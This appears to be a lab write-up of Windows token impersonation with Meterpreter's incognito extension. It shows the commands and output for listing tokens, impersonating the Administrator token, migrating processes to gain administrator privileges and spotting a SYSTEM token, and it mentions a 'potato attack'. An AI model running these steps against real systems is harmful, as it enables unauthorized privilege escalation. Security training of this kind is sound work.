meterpreter > `load incognito`
Loading extension incognito...Success.

# Now we can check for other access tokens avaialable, we observe that there are 2 delegation tokens (the one which require traditional login or RDP) and no impersonation token (one which dosent require user to login)

meterpreter > `list_tokens -u`
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
ATTACKDEFENSE\Administrator
NT AUTHORITY\LOCAL SERVICE

Impersonation Tokens Available
========================================
No tokens available

meterpreter > 

# We have the Administrator User account access token which can help us to escalate privileges, We observe that we successfull impersonated the admininstrator user,  now if we migrate to 64 bit process it allows us to migrate and if we see our privileges , we can see we have many other privileges of administrator user and also the uid changed to ATTACKDEFENSE\Administrator

meterpreter > `impersonate_token "ATTACKDEFENSE\Administrator"`
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user ATTACKDEFENSE\Administrator
meterpreter > `getprivs`
[-] stdapi_sys_config_getprivs: Operation failed: Access is denied.
meterpreter > `migrate 3360`
[*] Migrating from 3076 to 3360...
[*] Migration completed successfully.
meterpreter > `getprivs`

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > `getuid`
Server username: ATTACKDEFENSE\Administrator
meterpreter > 

# Finaly we have escalated to Admininstrator privileges...

*****************************************************************************************************************************

# Now since we have already escalated privileges we see additional access tokens which we can impersonate and gain privileges assosiated with that token

meterpreter > `list_tokens -u`
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
ATTACKDEFENSE\Administrator
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\SYSTEM
Window Manager\DWM-1

Impersonation Tokens Available
========================================
Font Driver Host\UMFD-0
Font Driver Host\UMFD-1
NT AUTHORITY\NETWORK SERVICE

meterpreter > 

# Now if we observe we have one Delegation Token as `NT AUTHORITY\SYSTEM`, Now there might be case when do get any access tokens available using `list_tokens -u`, in that case we need to do `patato attack` ie our second technique 

# we basically patatto attack will do is that it will generate you access Token `NT AUTHORITY\SYSTEM`